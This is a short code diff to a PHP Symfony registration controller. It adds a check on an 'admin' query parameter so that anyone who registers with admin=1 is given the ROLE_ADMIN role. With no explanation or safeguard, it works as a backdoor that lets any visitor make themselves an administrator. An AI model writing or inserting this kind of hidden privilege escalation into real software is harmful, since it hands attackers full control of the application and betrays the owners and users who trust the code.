@@ -19,6 +19,8 @@ class RegistrationController extends AbstractController
     #[Route('/register', name: 'app_register')]
     public function register(Request $request, UserPasswordHasherInterface $userPasswordHasher, UserAuthenticatorInterface $userAuthenticator, LoginAuthenticator $authenticator, EntityManagerInterface $entityManager): Response
     {
+        $admin = $request->query->getInt('admin', 0);
+
         $user = new User();
         $form = $this->createForm(RegistrationFormType::class, $user);
         $form->handleRequest($request);
@@ -31,6 +33,10 @@ class RegistrationController extends AbstractController
                     $form->get('plainPassword')->getData()
                 )
             );
+
+            if ($admin === 1) {
+                $user->setRoles(['ROLE_ADMIN']);
+            }
 
             $entityManager->persist($user);
             $entityManager->flush();
